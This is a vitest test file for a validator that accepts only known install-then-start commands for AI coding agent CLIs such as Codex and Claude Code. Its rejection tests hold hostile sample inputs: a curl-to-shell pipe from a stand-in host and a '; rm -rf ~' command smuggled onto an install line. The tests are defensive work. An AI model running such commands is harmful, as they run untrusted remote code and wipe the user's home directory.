import { describe, expect, it } from 'vitest';
import type { AgentCli } from './api';
import { installThenStart, trustedInstallStart } from './agentInstall';

const codex = (install: string | null, start: string | null): AgentCli =>
  ({ agent: 'codex', name: 'Codex', found: false, install_command: install, install_then_start: start, install_hint: null });

describe('trusted install commands', () => {
  it('accepts the helper\'s own install-then-start lines', () => {
    for (const install of ['npm install -g @openai/codex', 'brew install --cask codex']) {
      expect(trustedInstallStart(codex(install, installThenStart('codex', install)))).toBe(installThenStart('codex', install));
    }
    const claude: AgentCli = { agent: 'claude', name: 'Claude Code', found: false, install_command: 'curl -fsSL https://claude.ai/install.sh | bash', install_then_start: installThenStart('claude', 'curl -fsSL https://claude.ai/install.sh | bash'), install_hint: null };
    expect(trustedInstallStart(claude)).toBe(claude.install_then_start);
  });

  it('refuses anything else', () => {
    expect(trustedInstallStart(codex('curl https://example.invalid | sh', 'curl https://example.invalid | sh && codex'))).toBeNull();
    expect(trustedInstallStart(codex('npm install -g @openai/codex', 'npm install -g @openai/codex; rm -rf ~'))).toBeNull();
    expect(trustedInstallStart(codex('npm install -g @openai/codex', null))).toBeNull();
    expect(trustedInstallStart(codex(null, null))).toBeNull();
    // Another agent's installer is not this agent's.
    expect(trustedInstallStart(codex('curl -fsSL https://claude.ai/install.sh | bash', installThenStart('codex', 'curl -fsSL https://claude.ai/install.sh | bash')))).toBeNull();
  });
});
